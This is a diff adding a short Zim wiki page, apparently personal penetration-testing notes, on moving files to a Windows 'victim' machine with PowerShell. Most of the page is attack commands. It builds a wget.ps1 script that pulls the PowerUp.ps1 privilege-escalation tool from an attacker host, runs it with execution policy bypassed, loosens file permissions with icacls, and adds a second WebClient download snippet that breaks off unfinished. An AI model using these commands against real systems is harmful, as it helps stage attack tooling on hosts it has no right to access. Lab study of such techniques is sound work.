@@ -1,0 +1,27 @@
+Content-Type: text/x-zim-wiki
+Wiki-Format: zim 0.4
+Creation-Date: 2018-10-06T22:28:25+05:30
+
+====== File Transfer - PowerShell ======
+Created Saturday 06 October 2018
+
+Run the following in attacker's machine
+echo $storageDir = $pwd >wget.ps1
+echo $webclient = New-Object System.Net.WebClient >> wget.ps1
+echo $url = "http://192.168.49.31:6767/" >> wget.ps1
+echo $file = "PowerUp.ps1" >> wget.ps1
+echo $webclient.DownloadFile($url,$file) >>wget.ps1
+
+Run the following in victim's machine(Windows)
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
+powershell.exe -ExecutionPolicy Bypass -File wget.ps1
+powershell.exe -exec bypass
+
+icacls wget.ps1 /grant Users:F
+$url = "http://<IP>:8787/
+$output = "$PSScriptRoot\10meg.test"
+$start_time = Get-Date
+
+$wc = New-Object System.Net.WebClient
+$wc.DownloadFile($url, $output)
+#OR
